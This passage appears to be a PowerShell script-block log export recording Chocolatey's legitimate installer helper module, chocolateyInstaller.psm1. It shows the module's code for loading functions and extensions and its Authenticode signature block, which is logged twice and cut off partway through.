Version is '$($PSVersionTable.CLRVersion)'."" # grab functions from files Get-Item $helpersPath\functions\*.ps1 | ? { -not ($_.Name.Contains("".Tests."")) } | % { . $_.FullName; #Export-ModuleMember -Function $_.BaseName } # Export built-in functions prior to loading extensions so that # extension-specific loading behavior can be used based on built-in # functions. This allows those overrides to be much more deterministic # This behavior was broken from v0.9.9.5 - v0.10.3. Export-ModuleMember -Function * -Alias * -Cmdlet * $currentAssemblies = [System.AppDomain]::CurrentDomain.GetAssemblies() # load extensions if they exist $extensionsPath = Join-Path ""$helpersPath"" '..\extensions' if (Test-Path($extensionsPath)) { Write-Debug 'Loading community extensions' Get-ChildItem $extensionsPath -recurse -filter ""*.dll"" | Select -ExpandProperty FullName | % { $path = $_; if ($path.Contains(""extensions\chocolatey\lib-synced"")) { continue } try { Write-Debug ""Importing '$path'""; $fileNameWithoutExtension = $([System.IO.Path]::GetFileNameWithoutExtension($path)) Write-Debug ""Loading '$fileNameWithoutExtension' extension.""; $loaded = $false $currentAssemblies | % { $name = $_.GetName().Name if ($name -eq $fileNameWithoutExtension) { Import-Module $_ $loaded = $true } } if (!$loaded) { Import-Module $path; } } catch { if ($env:ChocolateyPowerShellHost -eq 'true') { Write-Warning ""Import failed for '$path'. Error: '$_'"" } else { Write-Warning ""Import failed for '$path'. If it depends on a newer version of the .NET framework, please make sure you are using the built-in PowerShell Host. Error: '$_'"" } } } #Resolve-Path $extensionsPath\**\*\*.psm1 | % { Write-Debug ""Importing `'$_`'""; Import-Module $_.ProviderPath } Get-ChildItem $extensionsPath -recurse -filter ""*.psm1"" | Select -ExpandProperty FullName | % { Write-Debug ""Importing `'$_`'""; Import-Module $_; } } # todo: explore removing this for a future version Export-ModuleMember -Function * -Alias * -Cmdlet * # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCBpXDGe+ALqwCJ # YsrRVbudLVLfjC+vZjhGFqLdiSXpYaCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgwmHjAcUy+iE+dyiIfi2zB5dbGJZWd7DUt/no # Ll1cr0gwDQYJKoZIhvcNAQEBBQAEggEARX58JVHLurcXQTf7fttDVIUmw5vuH+lD # raYqEYC1l92+ucU8i5J015Gv8jVcDC4gXcE4hijQ6rryX4ikBymH/qmVWLrIA4NU # a2aYYcq26oWCODgd9NOPoPvBNLg6wZNCR+BNpZ7EQ92mY4+hR6SO2lmap2D/MHCQ # FrQ6UIbfUTTHZ6KuJn8hEMizgb9w7n9uwzqh4KkA0mp/MJEIGTQIuIQTZvNs/oZQ # yTqOyO1DTHfTUs3PrvsPyTQam8k2c1z9MftLTeeAsTEScGa0/wu0HPTBdlXPVN3R # AmPtXHvT64I/IDN9FQ+NV6OdHrlOitGteeh+B6qDkoF3zr9UGzrdpaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAzWjAjBgkqhkiG9w0BCQQxFgQUReNlyfyc12kJ8VKD # f/nnmCJJFB4wDQYJKoZIhvcNAQEBBQAEggEAbahPWSbk7P/cx1sVMWPwsMH7tEIi # mCqQdlL3sr1tKO0JGxndzqRPhk3doLiL4FyKlRs6F91d9tggZgwcVsPYLSAk9/84 # wbxqv2j/KzCY6uq0uuHUsYKTuCXn2cyYqB1Iu9GCj6szi3F8KlzlNEE6EPtVYHY6 # U4pxNhGijHdAMuMtaSuK+6ZYrICOdwPTbozno88gE1GV1nPgGmVr2mxN8fwExzd8 # 7tyNCSUJg9DaM9Jw4f3zPE64PaY2V+dqZW8bHn9U0sHS8HkTEwFki4j+pg91Tdxq # A4xJiCcSSTW60n7N2tSs7VNaDxtBVK6FX48t0jMCazDRpMgfKXm7wGlvkw== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateyInstall\helpers\chocolateyInstaller.psm1 ¦ ScriptBlockId: bc805ba9-9458-44c4-82c2-c620fcf138b0 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. $helpersPath = (Split-Path -parent $MyInvocation.MyCommand.Definition); $global:DebugPreference = ""SilentlyContinue"" if ($env:ChocolateyEnvironmentDebug -eq 'true') { $global:DebugPreference = ""Continue""; } $global:VerbosePreference = ""SilentlyContinue"" if ($env:ChocolateyEnvironmentVerbose -eq 'true') { $global:VerbosePreference = ""Continue""; $verbosity = $true } $installArguments = $env:chocolateyInstallArguments $overrideArgs = $false if ($env:chocolateyInstallOverride -eq 'true') { $overrideArgs = $true } $forceX86 = $false if ($env:chocolateyForceX86 -eq 'true') { $forceX86 = $true } $packageParameters = $env:chocolateyPackageParameters # ensure module loading preference is on $PSModuleAutoLoadingPreference = ""All""; Write-Debug ""Host version is $($host.Version), PowerShell Version is '$($PSVersionTable.PSVersion)' and CLR Version is '$($PSVersionTable.CLRVersion)'."" # grab functions from files Get-Item $helpersPath\functions\*.ps1 | ? { -not ($_.Name.Contains("".Tests."")) } | % { . $_.FullName; #Export-ModuleMember -Function $_.BaseName } # Export built-in functions prior to loading extensions so that # extension-specific loading behavior can be used based on built-in # functions. This allows those overrides to be much more deterministic # This behavior was broken from v0.9.9.5 - v0.10.3. Export-ModuleMember -Function * -Alias * -Cmdlet * $currentAssemblies = [System.AppDomain]::CurrentDomain.GetAssemblies() # load extensions if they exist $extensionsPath = Join-Path ""$helpersPath"" '..\extensions' if (Test-Path($extensionsPath)) { Write-Debug 'Loading community extensions' Get-ChildItem $extensionsPath -recurse -filter ""*.dll"" | Select -ExpandProperty FullName | % { $path = $_; if ($path.Contains(""extensions\chocolatey\lib-synced"")) { continue } try { Write-Debug ""Importing '$path'""; $fileNameWithoutExtension = $([System.IO.Path]::GetFileNameWithoutExtension($path)) Write-Debug ""Loading '$fileNameWithoutExtension' extension.""; $loaded = $false $currentAssemblies | % { $name = $_.GetName().Name if ($name -eq $fileNameWithoutExtension) { Import-Module $_ $loaded = $true } } if (!$loaded) { Import-Module $path; } } catch { if ($env:ChocolateyPowerShellHost -eq 'true') { Write-Warning ""Import failed for '$path'. Error: '$_'"" } else { Write-Warning ""Import failed for '$path'. If it depends on a newer version of the .NET framework, please make sure you are using the built-in PowerShell Host. Error: '$_'"" } } } #Resolve-Path $extensionsPath\**\*\*.psm1 | % { Write-Debug ""Importing `'$_`'""; Import-Module $_.ProviderPath } Get-ChildItem $extensionsPath -recurse -filter ""*.psm1"" | Select -ExpandProperty FullName | % { Write-Debug ""Importing `'$_`'""; Import-Module $_; } } # todo: explore removing this for a future version Export-ModuleMember -Function * -Alias * -Cmdlet * # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCBpXDGe+ALqwCJ # YsrRVbudLVLfjC+vZjhGFqLdiSXpYaCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # 